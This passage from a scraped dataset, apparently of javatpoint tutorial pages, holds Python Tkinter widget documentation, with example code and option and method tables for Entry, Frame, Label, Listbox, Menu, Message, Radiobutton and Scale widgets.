checkbutton.&&&5|||toggle()|||It is used to toggle between the different Checkbuttons.']",[]
470,['Python Tkinter Entry'],"['The Entry widget is used to provde the single line text-box to the user to accept a value from the user. We can use the Entry widget to accept the text strings from the user. It can only be used for one line of text from the user. For multiple lines of text, we must use the text widget. ']","['https://www.javatpoint.com/python-tkinter-frame', 'https://www.javatpoint.com/python-tkinter-checkbutton', 'https://www.javatpoint.com/python-tkinter-frame', 'https://www.javatpoint.com/python-tkinter-checkbutton', 'https://www.javatpoint.com/python-tkinter-frame']","['https://static.javatpoint.com/python/images/python-tkinter-entry.png', 'https://static.javatpoint.com/python/images/python-tkinter-entry2.png']",[],['Entry widget methods'],"['Syntax', 'Example', 'Example: A simple calculator']",[],"['The syntax to use the Entry widget is given below.', 'A list of possible options is given below.', 'Python provides various methods to configure the data written inside the widget. There are the following methods provided by the Entry widget.']",[],[],"['w = Entry (parent, options)', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'top.geometry(""400x250"")', 'name = Label(top, text = ""Name"").place(x = 30,y = 50)', 'email = Label(top, text = ""Email"").place(x = 30, y = 90)', 'password = Label(top, text = ""Password"").place(x = 30, y = 130)', 'sbmitbtn = Button(top, text = ""Submit"",activebackground = ""pink"", activeforeground = ""blue"").place(x = 30, y = 170)', 'e1 = Entry(top).place(x = 80, y = 50)', 'e2 = Entry(top).place(x = 80, y = 90)', 'e3 = Entry(top).place(x = 95, y = 130)', 'top.mainloop()', 'import tkinter as tk', 'from functools import partial', 'def call_result(label_result, n1, n2):', 'num1 = (n1.get())', 'num2 = (n2.get())', 'result = int(num1)+int(num2)', 'label_result.config(text=""Result = %d"" % result)', 'return', 'root = tk.Tk()', ""root.geometry('400x200+100+200')"", ""root.title('Calculator')"", 'number1 = tk.StringVar()', 'number2 = tk.StringVar()', 'labelNum1 = tk.Label(root, text=""A"").grid(row=1, column=0)', 'labelNum2 = tk.Label(root, text=""B"").grid(row=2, column=0)', 'labelResult = tk.Label(root)', 'labelResult.grid(row=7, column=2)', 'entryNum1 = tk.Entry(root, textvariable=number1).grid(row=1, column=2)', 'entryNum2 = tk.Entry(root, textvariable=number2).grid(row=2, column=2)', 'call_result = partial(call_result, labelResult, number1, number2)', 'buttonCal = tk.Button(root, text=""Calculate"", command=call_result).grid(row=3, column=0)', 'root.mainloop()']",[],"['SN|||Option|||Description&&&1|||bg|||The background color of the widget.&&&2|||bd|||The border width of the widget in pixels.&&&3|||cursor|||The mouse pointer will be changed to the cursor type set to the arrow, dot, etc.&&&4|||exportselection|||The text written inside the entry box will be automatically copied to the clipboard by default. We can set the exportselection to 0 to not copy this.&&&5|||fg|||It represents the color of the text.&&&6|||font|||It represents the font type of the text.&&&7|||highlightbackground|||It represents the color to display in the traversal highlight region when the widget does not have the input focus.&&&8|||highlightcolor|||It represents the color to use for the traversal highlight rectangle that is drawn around the widget when it has the input focus.&&&9|||highlightthickness|||It represents a non-negative value indicating the width of the highlight rectangle to draw around the outside of the widget when it has the input focus.&&&10|||insertbackground|||It represents the color to use as background in the area covered by the insertion cursor. This color will normally override either the normal background for the widget.&&&11|||insertborderwidth|||It represents a non-negative value indicating the width of the 3-D border to draw around the insertion cursor. The value may have any of the forms acceptable to Tk_GetPixels.&&&12|||insertofftime|||It represents a non-negative integer value indicating the number of milliseconds the insertion cursor should remain ""off"" in each blink cycle. If this option is zero, then the cursor doesn\'t blink: it is on all the time.&&&13|||insertontime|||Specifies a non-negative integer value indicating the number of milliseconds the insertion cursor should remain ""on"" in each blink cycle.&&&14|||insertwidth|||It represents the value indicating the total width of the insertion cursor. The value may have any of the forms acceptable to Tk_GetPixels.&&&15|||justify|||It specifies how the text is organized if the text contains multiple lines.&&&16|||relief|||It specifies the type of the border. Its default value is FLAT.&&&17|||selectbackground|||The background color of the selected text.&&&18|||selectborderwidth|||The width of the border to display around the selected task.&&&19|||selectforeground|||The font color of the selected task. &&&20|||show|||It is used to show the entry text of some other type instead of the string. For example, the password is typed using stars (*).&&&21|||textvariable|||It is set to the instance of the StringVar to retrieve the text from the entry.&&&22|||width|||The width of the displayed text or image.&&&23|||xscrollcommand|||The entry widget can be linked to the horizontal scrollbar if we want the user to enter more text then the actual width of the widget.', 'SN|||Method|||Description&&&1|||delete(first, last = none)|||It is used to delete the specified characters inside the widget.&&&2|||get()|||It is used to get the text written inside the widget.&&&3|||icursor(index)|||It is used to change the insertion cursor position. We can specify the index of the character before which, the cursor to be placed.&&&4|||index(index)|||It is used to place the cursor to the left of the character written at the specified index.&&&5|||insert(index,s)|||It is used to insert the specified string before the character placed at the specified index.&&&6|||select_adjust(index)|||It includes the selection of the character present at the specified index.&&&7|||select_clear()|||It clears the selection if some selection has been done.&&&8|||select_form(index)|||It sets the anchor index position to the character specified by the index.&&&9|||select_present()|||It returns true if some text in the Entry is selected otherwise returns false.&&&10|||select_range(start,end)|||It selects the characters to exist between the specified range.&&&11|||select_to(index)|||It selects all the characters from the beginning to the specified index.&&&12|||xview(index)|||It is used to link the entry widget to a horizontal scrollbar.&&&13|||xview_scroll(number,what)|||It is used to make the entry scrollable horizontally.']",[]
471,['Python Tkinter Frame'],['Python Tkinter Frame widget is used to organize the group of widgets. It acts like a container which can be used to hold the other widgets. The rectangular areas of the screen are used to organize the widgets to the python application.'],"['https://www.javatpoint.com/python-tkinter-label', 'https://www.javatpoint.com/python-tkinter-entry', 'https://www.javatpoint.com/python-tkinter-label', 'https://www.javatpoint.com/python-tkinter-entry', 'https://www.javatpoint.com/python-tkinter-label']",['https://static.javatpoint.com/python/images/python-tkinter-frame.png'],[],[],"['Syntax', 'Example']",[],"['The syntax to use the Frame widget is given below.', 'A list of possible options is given below.']",[],[],"['w = Frame(parent,  options)', 'from tkinter import *', 'top = Tk()', 'top.geometry(""140x100"")', 'frame = Frame(top)', 'frame.pack()', 'leftframe = Frame(top)', 'leftframe.pack(side = LEFT)', 'rightframe = Frame(top)', 'rightframe.pack(side = RIGHT)', 'btn1 = Button(frame, text=""Submit"", fg=""red"",activebackground = ""red"")', 'btn1.pack(side = LEFT)', 'btn2 = Button(frame, text=""Remove"", fg=""brown"", activebackground = ""brown"")', 'btn2.pack(side = RIGHT)', 'btn3 = Button(rightframe, text=""Add"", fg=""blue"", activebackground = ""blue"")', 'btn3.pack(side = LEFT)', 'btn4 = Button(leftframe, text=""Modify"", fg=""black"", activebackground = ""white"")', 'btn4.pack(side = RIGHT)', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||bd|||It represents the border width.&&&2|||bg|||The background color of the widget. &&&3|||cursor|||The mouse pointer is changed to the cursor type set to different values like an arrow, dot, etc.&&&4|||height|||The height of the frame.&&&5|||highlightbackground|||The color of the background color when it is under focus.&&&6|||highlightcolor|||The text color when the widget is under focus.&&&7|||highlightthickness|||It specifies the thickness around the border when the widget is under the focus.&&&8|||relief|||It specifies the type of the border. The default value if FLAT.&&&9|||width|||It represents the width of the widget.']",[]
472,['Python Tkinter Label'],['The Label is used to specify the container box where we can place the text or images. This widget is used to provide the message to the user about other widgets used in the python application. '],"['https://www.javatpoint.com/python-tkinter-listbox', 'https://www.javatpoint.com/python-tkinter-frame', 'https://www.javatpoint.com/python-tkinter-listbox', 'https://www.javatpoint.com/python-tkinter-frame', 'https://www.javatpoint.com/python-tkinter-listbox']",['https://static.javatpoint.com/python/images/python-tkinter-label.png'],[],[],"['Syntax', 'Example 1']",[],"['There are the various options which can be specified to configure the text or the part of the text shown in the Label. ', 'The syntax to use the Label is given below.', 'A list of possible options is given below.']",[],[],"['w = Label (master, options)', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'top.geometry(""400x250"")', '#creating label', 'uname = Label(top, text = ""Username"").place(x = 30,y = 50)', '#creating label', 'password = Label(top, text = ""Password"").place(x = 30, y = 90)', 'sbmitbtn = Button(top, text = ""Submit"",activebackground = ""pink"", activeforeground = ""blue"").place(x = 30, y = 120)', 'e1 = Entry(top,width = 20).place(x = 100, y = 50)', 'e2 = Entry(top, width = 20).place(x = 100, y = 90)', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||anchor|||It specifies the exact position of the text within the size provided to the widget. The default value is CENTER, which is used to center the text within the specified space.&&&2|||bg|||The background color displayed behind the widget.&&&3|||bitmap|||It is used to set the bitmap to the graphical object specified so that, the label can represent the graphics instead of text.&&&4|||bd|||It represents the width of the border. The default is 2 pixels.&&&5|||cursor|||The mouse pointer will be changed to the type of the cursor specified, i.e., arrow, dot, etc.&&&6|||font|||The font type of the text written inside the widget.&&&7|||fg|||The foreground color of the text written inside the widget.&&&8|||height|||The height of the widget.&&&9|||image|||The image that is to be shown as the label.&&&10|||justify|||It is used to represent the orientation of the text if the text contains multiple lines. It can be set to LEFT for left justification, RIGHT for right justification, and CENTER for center justification.&&&11|||padx|||The horizontal padding of the text. The default value is 1.&&&12|||pady|||The vertical padding of the text. The default value is 1.&&&13|||relief|||The type of the border. The default value is FLAT.&&&14|||text|||This is set to the string variable which may contain one or more line of text.&&&15|||textvariable|||The text written inside the widget is set to the control variable StringVar so that it can be accessed and changed accordingly.&&&16|||underline|||We can display a line under the specified letter of the text. Set this option to the number of the letter under which the line will be displayed.&&&17|||width|||The width of the widget. It is specified as the number of characters.&&&18|||wraplength|||Instead of having only one line as the label text, we can break it to the number of lines where each line has the number of characters specified to this option.']",[]
473,['Python Tkinter Listbox'],['The Listbox widget is used to display the list items to the user. We can place only text items in the Listbox and all text items contain the same font and color. '],"['https://www.javatpoint.com/python-tkinter-menubutton', 'https://www.javatpoint.com/python-tkinter-label', 'https://www.javatpoint.com/python-tkinter-menubutton', 'https://www.javatpoint.com/python-tkinter-label', 'https://www.javatpoint.com/python-tkinter-menubutton']","['https://static.javatpoint.com/python/images/python-tkinter-listbox.png', 'https://static.javatpoint.com/python/images/python-tkinter-listbox2.png', 'https://static.javatpoint.com/python/images/python-tkinter-listbox3.png']",[],['Methods'],"['Example 1', 'Example 2: Deleting the active items from the list']",[],"['The user can choose one or more items from the list depending upon the configuration.', 'The syntax to use the Listbox is given below.', 'A list of possible options is given below.', 'There are the following methods associated with the Listbox.', 'After pressing the delete button.']",[],[],"['w = Listbox(parent, options)', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x250"")', 'lbl = Label(top,text = ""A list of favourite countries..."")', 'listbox = Listbox(top)', 'listbox.insert(1,""India"")', 'listbox.insert(2, ""USA"")', 'listbox.insert(3, ""Japan"")', 'listbox.insert(4, ""Austrelia"")', 'lbl.pack()', 'listbox.pack()', 'top.mainloop()', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x250"")', 'lbl = Label(top,text = ""A list of favourite countries..."")', 'listbox = Listbox(top)', 'listbox.insert(1,""India"")', 'listbox.insert(2, ""USA"")', 'listbox.insert(3, ""Japan"")', 'listbox.insert(4, ""Austrelia"")', '#this button will delete the selected item from the list', 'btn = Button(top, text = ""delete"", command = lambda listbox=listbox: listbox.delete(ANCHOR))', 'lbl.pack()', 'listbox.pack()', 'btn.pack()', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||bg|||The background color of the widget.&&&2|||bd|||It represents the size of the border. Default value is 2 pixel.&&&3|||cursor|||The mouse pointer will look like the cursor type like dot, arrow, etc.&&&4|||font|||The font type of the Listbox items. &&&5|||fg|||The color of the text.&&&6|||height|||It represents the count of the lines shown in the Listbox. The default value is 10.&&&7|||highlightcolor|||The color of the Listbox items when the widget is under focus. &&&8|||highlightthickness|||The thickness of the highlight.&&&9|||relief|||The type of the border. The default is SUNKEN.&&&10|||selectbackground|||The background color that is used to display the selected text.&&&11|||selectmode|||It is used to determine the number of items that can be selected from the list. It can set to BROWSE, SINGLE, MULTIPLE, EXTENDED.&&&12|||width|||It represents the width of the widget in characters.&&&13|||xscrollcommand|||It is used to let the user scroll the Listbox horizontally. &&&14|||yscrollcommand|||It is used to let the user scroll the Listbox vertically.', 'SN|||Method|||Description&&&1|||activate(index)|||It is used to select the lines at the specified index.&&&2|||curselection()|||It returns a tuple containing the line numbers of the selected element or elements, counting from 0. If nothing is selected, returns an empty tuple.&&&3|||delete(first, last = None)|||It is used to delete the lines which exist in the given range.&&&4|||get(first, last = None)|||It is used to get the list items that exist in the given range.&&&5|||index(i)|||It is used to place the line with the specified index at the top of the widget. &&&6|||insert(index, *elements)|||It is used to insert the new lines with the specified number of elements before the specified index.&&&7|||nearest(y)|||It returns the index of the nearest line to the y coordinate of the Listbox widget.&&&8|||see(index)|||It is used to adjust the position of the listbox to make the lines specified by the index visible.&&&9|||size()|||It returns the number of lines that are present in the Listbox widget.&&&10|||xview()|||This is used to make the widget horizontally scrollable.&&&11|||xview_moveto(fraction)|||It is used to make the listbox horizontally scrollable by the fraction of width of the longest line present in the listbox.&&&12|||xview_scroll(number, what)|||It is used to make the listbox horizontally scrollable by the number of characters specified.&&&13|||yview()|||It allows the Listbox to be vertically scrollable.&&&14|||yview_moveto(fraction)|||It is used to make the listbox vertically scrollable by the fraction of width of the longest line present in the listbox.&&&15|||yview_scroll (number, what)|||It is used to make the listbox vertically scrollable by the number of characters specified.']",[]
474,['Python Tkinter Menubutton'],['The Menubutton widget can be defined as the drop-down menu that is shown to the user all the time. It is used to provide the user a option to select the appropriate choice exist within the application. '],"['https://www.javatpoint.com/python-tkinter-menu', 'https://www.javatpoint.com/python-tkinter-listbox', 'https://www.javatpoint.com/python-tkinter-menu', 'https://www.javatpoint.com/python-tkinter-listbox', 'https://www.javatpoint.com/python-tkinter-menu']",['https://static.javatpoint.com/python/images/python-tkinter-menubutton.png'],[],[],"['Syntax', 'Example']",[],"['The syntax to use the python tkinter Menubutton is given below.', 'A list of various options is given below.']",['The Menubutton is used to implement various types of menus in the python application. A Menu is associated with the Menubutton that can display the choices of the Menubutton when clicked by the user.'],[],"['w = Menubutton(Top, options)', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x250"")', 'menubutton = Menubutton(top, text = ""Language"", relief = FLAT)', 'menubutton.grid()', 'menubutton.menu = Menu(menubutton)', 'menubutton[""menu""]=menubutton.menu', 'menubutton.menu.add_checkbutton(label = ""Hindi"", variable=IntVar())', 'menubutton.menu.add_checkbutton(label = ""English"", variable = IntVar())', 'menubutton.pack()', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||activebackground|||The background color of the widget when the widget is under focus.&&&2|||activeforeground|||The font color of the widget text when the widget is under focus.&&&3|||anchor|||It specifies the exact position of the widget content when the widget is assigned more space than needed.&&&4|||bg|||It specifies the background color of the widget.&&&5|||bitmap|||It is set to the graphical content which is to be displayed to the widget.&&&6|||bd|||It represents the size of the border. The default value is 2 pixels.&&&7|||cursor|||The mouse pointer will be changed to the cursor type specified when the widget is under the focus. The possible value of the cursor type is arrow, or dot etc.&&&8|||direction|||It direction can be specified so that menu can be displayed to the specified direction of the button. Use LEFT, RIGHT, or ABOVE to place the widget accordingly.&&&9|||disabledforeground|||The text color of the widget when the widget is disabled.&&&10|||fg|||The normal foreground color of the widget.&&&11|||height|||The vertical dimension of the Menubutton. It is specified as the number of lines.&&&12|||highlightcolor|||The highlight color shown to the widget under focus.&&&13|||image|||The image displayed on the widget. &&&14|||justify|||This specified the exact position of the text under the widget when the text is unable to fill the width of the widget. We can use the LEFT for the left justification, RIGHT for the right justification, CENTER for the centre justification.&&&15|||menu|||It represents the menu specified with the Menubutton.&&&16|||padx|||The horizontal padding of the widget.&&&17|||pady|||The vertical padding of the widget.&&&18|||relief|||This option specifies the type of the border. The default value is RAISED.&&&19|||state|||The normal state of the Mousebutton is enabled. We can set it to DISABLED to make it unresponsive. &&&20|||text|||The text shown with the widget.&&&21|||textvariable|||We can set the control variable of string type to the text variable so that we can control the text of the widget at runtime.&&&22|||underline|||The text of the widget is not underlined by default but we can set this option to make the text of the widget underlined.&&&23|||width|||It represents the width of the widget in characters. The default value is 20.&&&24|||wraplength|||We can break the text of the widget in the number of lines so that the text contains the number of lines not greater than the specified value.']",[]
475,['Python Tkinter Menu '],"['The Menu widget is used to create various types of menus (top level, pull down, and pop up) in the python application. ']","['https://www.javatpoint.com/python-tkinter-message', 'https://www.javatpoint.com/python-tkinter-menubutton', 'https://www.javatpoint.com/python-tkinter-message', 'https://www.javatpoint.com/python-tkinter-menubutton', 'https://www.javatpoint.com/python-tkinter-message']","['https://static.javatpoint.com/python/images/python-tkinter-menu-output1.png', 'https://static.javatpoint.com/python/images/python-tkinter-menu-output2.png']",[],"['Methods ', 'Creating a top level menu ']","['Syntax', 'Example 1', 'Example 2']",[],"['The syntax to use the Menu widget is given below. ', 'A list of possible options is given below. ', 'The Menu widget contains the following methods. ', 'A top-level menu can be created by instantiating the Menu widget and adding the menu items to the menu.', 'Clicking the hello Menubutton will print the hello on the console while clicking the Quit Menubutton will make an exit from the python application.']",['The top-level menus are the one which is displayed just under the title bar of the parent window. We need to create a new instance of the Menu widget and add various commands to it by using the add() method.'],[],"['w = Menu(top, options)', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'def hello():', 'print(""hello!"")', '# create a toplevel menu', 'menubar = Menu(root)', 'menubar.add_command(label=""Hello!"", command=hello)', 'menubar.add_command(label=""Quit!"", command=top.quit)', '# display the menu', 'top.config(menu=menubar)', 'top.mainloop()', 'from tkinter import Toplevel, Button, Tk, Menu', 'top = Tk()', 'menubar = Menu(top)', 'file = Menu(menubar, tearoff=0)', 'file.add_command(label=""New"")', 'file.add_command(label=""Open"")', 'file.add_command(label=""Save"")', 'file.add_command(label=""Save as..."")', 'file.add_command(label=""Close"")', 'file.add_separator()', 'file.add_command(label=""Exit"", command=top.quit)', 'menubar.add_cascade(label=""File"", menu=file)', 'edit = Menu(menubar, tearoff=0)', 'edit.add_command(label=""Undo"")', 'edit.add_separator()', 'edit.add_command(label=""Cut"")', 'edit.add_command(label=""Copy"")', 'edit.add_command(label=""Paste"")', 'edit.add_command(label=""Delete"")', 'edit.add_command(label=""Select All"")', 'menubar.add_cascade(label=""Edit"", menu=edit)', 'help = Menu(menubar, tearoff=0)', 'help.add_command(label=""About"")', 'menubar.add_cascade(label=""Help"", menu=help)', 'top.config(menu=menubar)', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||activebackground|||The background color of the widget when the widget is under the focus.&&&2|||activeborderwidth|||The width of the border of the widget when it is under the mouse. The default is 1 pixel.&&&3|||activeforeground|||The font color of the widget when the widget has the focus.&&&4|||bg|||The background color of the widget.&&&5|||bd|||The border width of the widget.&&&6|||cursor|||The mouse pointer is changed to the cursor type when it hovers the widget. The cursor type can be set to arrow or dot. &&&7|||disabledforeground|||The font color of the widget when it is disabled. &&&8|||font|||The font type of the text of the widget. &&&9|||fg|||The foreground color of the widget. &&&10|||postcommand|||The postcommand can be set to any of the function which is called when the mourse hovers the menu. &&&11|||relief|||The type of the border of the widget. The default type is RAISED. &&&12|||image|||It is used to display an image on the menu. &&&13|||selectcolor|||The color used to display the checkbutton or radiobutton when they are selected. &&&14|||tearoff|||By default, the choices in the menu start taking place from position 1. If we set the tearoff = 1, then it will start taking place from 0th position.&&&15|||title|||Set this option to the title of the window if you want to change the title of the window.', 'SN|||Option|||Description&&&1|||add_command(options)|||It is used to add the Menu items to the menu.&&&2|||add_radiobutton(options)|||This method adds the radiobutton to the menu.&&&3|||add_checkbutton(options)|||This method is used to add the checkbuttons to the menu.&&&4|||add_cascade(options)|||It is used to create a hierarchical menu to the parent menu by associating the given menu to the parent menu.&&&5|||add_seperator()|||It is used to add the seperator line to the menu.&&&6|||add(type, options)|||It is used to add the specific menu item to the menu.&&&7|||delete(startindex, endindex)|||It is used to delete the menu items exist in the specified range.&&&8|||entryconfig(index, options)|||It is used to configure a menu item identified by the given index.&&&9|||index(item)|||It is used to get the index of the specified menu item.&&&10|||insert_seperator(index)|||It is used to insert a seperator at the specified index.&&&11|||invoke(index)|||It is used to invoke the associated with the choice given at the specified index.&&&12|||type(index)|||It is used to get the type of the choice specified by the index. ']",[]
476,['Python Tkinter Message'],['The Message widget is used to show the message to the user regarding the behaviour of the python application. The message widget shows the text messages to the user which can not be edited. '],"['https://www.javatpoint.com/python-tkinter-radiobutton', 'https://www.javatpoint.com/python-tkinter-menu', 'https://www.javatpoint.com/python-tkinter-radiobutton', 'https://www.javatpoint.com/python-tkinter-menu', 'https://www.javatpoint.com/python-tkinter-radiobutton']",['https://static.javatpoint.com/python/images/python-tkinter-message-output.png'],[],[],"['Syntax', 'Example']",[],"['The message text contains more than one line. However, the message can only be shown in the single font. ', 'The syntax to use the Message widget is given below. ', 'A list of possible options is given below. ']",[],[],"['w = Message(parent, options)', 'from tkinter import *', 'top = Tk()', 'top.geometry(""100x100"")', 'var = StringVar()', 'msg = Message( top, text = ""Welcome to Javatpoint"")', 'msg.pack()', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||anchor|||It is used to decide the exact position of the text within the space provided to the widget if the widget contains more space than the need of the text. The default is CENTER. &&&2|||bg|||The background color of the widget. &&&3|||bitmap|||It is used to display the graphics on the widget. It can be set to any graphical or image object. &&&4|||bd|||It represents the size of the border in the pixel. The default size is 2 pixel.&&&5|||cursor|||The mouse pointer is changed to the specified cursor type. The cursor type can be an arrow, dot, etc.&&&6|||font|||The font type of the widget text. &&&7|||fg|||The font color of the widget text. &&&8|||height|||The vertical dimension of the message.&&&9|||image|||We can set this option to a static image to show that onto the widget. &&&10|||justify|||This option is used to specify the alignment of multiple line of code with respect to each other. The possible values can be LEFT (left alignment), CENTER (default), and RIGHT (right alignment). &&&11|||padx|||The horizontal padding of the widget.&&&12|||pady|||The vertical padding of the widget. &&&13|||relief|||It represents the type of the border. The default type is FLAT. &&&14|||text|||We can set this option to the string so that the widget can represent the specified text. &&&15|||textvariable|||This is used to control the text represented by the widget. The textvariable can be set to the text that is shown in the widget. &&&16|||underline|||The default value of this option is -1 that represents no underline. We can set this option to an existing number to specify that nth letter of the string will be underlined. &&&17|||width|||It specifies the horizontal dimension of the widget in the number of characters (not pixel).&&&18|||wraplength|||We can wrap the text to the number of lines by setting this option to the desired number so that each line contains only that number of characters. ']",[]
477,['Python Tkinter Radiobutton '],"['The Radiobutton widget is used to implement one-of-many selection in the python application. It shows multiple choices to the user out of which, the user can select only one out of them. We can associate different methods with each of the radiobutton. ']","['https://www.javatpoint.com/python-tkinter-scale', 'https://www.javatpoint.com/python-tkinter-message', 'https://www.javatpoint.com/python-tkinter-scale', 'https://www.javatpoint.com/python-tkinter-message', 'https://www.javatpoint.com/python-tkinter-scale']",['https://static.javatpoint.com/python/images/python-tkinter-radiobutton-output.png'],[],['Methods'],"['Syntax', 'Example']",[],"['The syntax to use the Radiobutton is given below. ', 'The radiobutton widget provides the following methods. ']","[""We can display the multiple line text or images on the radiobuttons. To keep track the user's selection the radiobutton, it is associated with a single variable. Each button displays a single value for that particular variable.""]",[],"['w = Radiobutton(top, options)', 'from tkinter import *', 'def selection():', 'selection = ""You selected the option "" + str(radio.get())', 'label.config(text = selection)', 'top = Tk()', 'top.geometry(""300x150"")', 'radio = IntVar()', 'lbl = Label(text = ""Favourite programming language:"")', 'lbl.pack()', 'R1 = Radiobutton(top, text=""C"", variable=radio, value=1,', 'command=selection)', 'R1.pack( anchor = W )', 'R2 = Radiobutton(top, text=""C++"", variable=radio, value=2,', 'command=selection)', 'R2.pack( anchor = W )', 'R3 = Radiobutton(top, text=""Java"", variable=radio, value=3,', 'command=selection)', 'R3.pack( anchor = W)', 'label = Label(top)', 'label.pack()', 'top.mainloop()']",[],"[""SN|||Option|||Description&&&1|||activebackground|||The background color of the widget when it has the focus. &&&2|||activeforeground|||The font color of the widget text when it has the focus. &&&3|||anchor|||It represents the exact position of the text within the widget if the widget contains more space than the requirement of the text. The default value is CENTER.&&&4|||bg|||The background color of the widget. &&&5|||bitmap|||It is used to display the graphics on the widget. It can be set to any graphical or image object. &&&6|||borderwidth|||It represents the size of the border. &&&7|||command|||This option is set to the procedure which must be called every-time when the state of the radiobutton is changed.&&&8|||cursor|||The mouse pointer is changed to the specified cursor type. It can be set to the arrow, dot, etc. &&&9|||font|||It represents the font type of the widget text. &&&10|||fg|||The normal foreground color of the widget text. &&&11|||height|||The vertical dimension of the widget. It is specified as the number of lines (not pixel).&&&12|||highlightcolor|||It represents the color of the focus highlight when the widget has the focus.&&&13|||highlightbackground|||The color of the focus highlight when the widget is not having the focus. &&&14|||image|||It can be set to an image object if we want to display an image on the radiobutton instead the text. &&&15|||justify|||It represents the justification of the multi-line text. It can be set to CENTER(default), LEFT, or RIGHT. &&&16|||padx|||The horizontal padding of the widget. &&&17|||pady|||The vertical padding of the widget. &&&18|||relief|||The type of the border. The default value is FLAT. &&&19|||selectcolor|||The color of the radio button when it is selected. &&&20|||selectimage|||The image to be displayed on the radiobutton when it is selected. &&&21|||state|||It represents the state of the radio button. The default state of the Radiobutton is NORMAL. However, we can set this to DISABLED to make the radiobutton unresponsive. &&&22|||text|||The text to be displayed on the radiobutton. &&&23|||textvariable|||It is of String type that represents the text displayed by the widget. &&&24|||underline|||The default value of this option is -1, however, we can set this option to the number of character which is to be underlined. &&&25|||value|||The value of each radiobutton is assigned to the control variable when it is turned on by the user. &&&26|||variable|||It is the control variable which is used to keep track of the user's choices. It is shared among all the radiobuttons. &&&27|||width|||The horizontal dimension of the widget. It is represented as the number of characters.&&&28|||wraplength|||We can wrap the text to the number of lines by setting this option to the desired number so that each line contains only that number of characters. "", 'SN|||Method|||Description&&&1|||deselect()|||It is used to turn of the radiobutton. ||||||2|||flash()|||It is used to flash the radiobutton between its active and normal colors few times. ||||||3|||invoke()|||It is used to call any procedure associated when the state of a Radiobutton is changed. ||||||4|||select()|||It is used to select the radiobutton. |||&&&2|||flash()|||It is used to flash the radiobutton between its active and normal colors few times. ||||||3|||invoke()|||It is used to call any procedure associated when the state of a Radiobutton is changed. ||||||4|||select()|||It is used to select the radiobutton. |||&&&3|||invoke()|||It is used to call any procedure associated when the state of a Radiobutton is changed. ||||||4|||select()|||It is used to select the radiobutton. |||&&&4|||select()|||It is used to select the radiobutton. ']",[]
478,['Python Tkinter Scale '],['The Scale widget is used to implement the graphical slider to the python application so that the user can slide through the range of values shown on the slider and select the one among them. '],"['https://www.javatpoint.com/python-tkinter-scrollbar', 'https://www.javatpoint.com/python-tkinter-radiobutton', 'https://www.javatpoint.com/python-tkinter-scrollbar', 'https://www.javatpoint.com/python-tkinter-radiobutton', 'https://www.javatpoint.com/python-tkinter-scrollbar']",['https://static.javatpoint.com/python/images/python-tkinter-scale-output.png'],[],['Methods '],"['Syntax ', 'Example']",[],"['The syntax to use the Scale widget is given below. ', 'A list of possible options is given below. ']",['We can control the minimum and maximum values along with the resolution of the scale. It provides an alternative to the Entry widget when the user is forced to select only one value from the given range of values. '],[],"['w = Scale(top, options)', 'from tkinter import *', 'def select():', 'sel = ""Value = "" + str(v.get())', 'label.config(text = sel)', 'top = Tk()', 'top.geometry(""200x100"")', 'v = DoubleVar()', 'scale = Scale( top, variable = v, from_ = 1, to = 50, orient = HORIZONTAL)', 'scale.pack(anchor=CENTER)', 'btn = Button(top, text=""Value"", command=select)', 'btn.pack(anchor=CENTER)', 'label = Label(top)', 'label.pack()', 'top.mainloop()']",[],"[""SN|||Option|||Description&&&1|||activebackground|||The background color of the widget when it has the focus.&&&2|||bg|||The background color of the widget.&&&3|||bd|||The border size of the widget. The default is 2 pixel.&&&4|||command|||It is set to the procedure which is called each time when we move the slider. If the slider is moved rapidly, the callback is done when it settles.&&&5|||cursor|||The mouse pointer is changed to the cursor type assigned to this option. It can be an arrow, dot, etc.&&&6|||digits|||If the control variable used to control the scale data is of string type, this option is used to specify the number of digits when the numeric scale is converted to a string.&&&7|||font|||The font type of the widget text.&&&8|||fg|||The foreground color of the text.&&&9|||from_|||It is used to represent one end of the widget range.&&&10|||highlightbackground|||The highlight color when the widget doesn't have the focus.&&&11|||highlighcolor|||The highlight color when the widget has the focus.&&&12|||label|||This can be set to some text which can be shown as a label with the scale. It is shown in the top left corner if the scale is horizontal or the top right corner if the scale is vertical.&&&13|||length|||It represents the length of the widget. It represents the X dimension if the scale is horizontal or y dimension if the scale is vertical.&&&14|||orient|||It can be set to horizontal or vertical depending upon the type of the scale.&&&15|||relief|||It represents the type of the border. The default is FLAT.&&&16|||repeatdelay|||This option tells the duration up to which the button is to be pressed before the slider starts moving in that direction repeatedly. The default is 300 ms.&&&17|||resolution|||It is set to the smallest change which is to be made to the scale value.&&&18|||showvalue|||The value of the scale is shown in the text form by default. We can set this option to 0 to suppress the label.&&&19|||sliderlength|||It represents the length of the slider window along the length of the scale. The default is 30 pixels. However, we can change it to the appropriate value.&&&20|||state|||The scale widget is active by default. We can set this to DISABLED to make it unresponsive.&&&21|||takefocus|||The focus cycles through the scale widgets by default. We can set this option to 0 if we don't want this to happen.&&&22|||tickinterval|||The scale values are displayed on the multiple of the specified tick interval. The default value of the tickinterval is 0.&&&23|||to|||It represents a float or integer value that specifies the other end of the range represented by the scale.&&&24|||troughcolor|||It represents the color of the through.&&&25|||variable|||It represents the control variable for the scale.&&&26|||width|||It represents the width of the through part of the widget."", 'SN|||Method|||Description&&&1|||get()|||It is used to get the current value of the scale.&&&2|||set(value)|||It is used to set the value of the scale. ']",[]
